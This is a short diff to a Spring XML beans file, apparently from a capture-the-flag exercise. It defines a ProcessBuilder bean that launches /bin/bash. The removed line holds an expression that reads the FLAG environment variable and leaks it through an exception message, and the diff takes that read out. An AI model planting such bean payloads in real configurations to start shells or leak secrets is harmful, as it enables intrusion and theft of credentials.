@@ -6,6 +6,6 @@
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
      <constructor-arg value="/bin/bash" />
-     <property name="whatever" value="#{ throw new IOException(System.getenv(\"FLAG\")) }"/>
+     <property name="whatever" value="#{ throw new IOException() }"/>
   </bean>
 </beans>
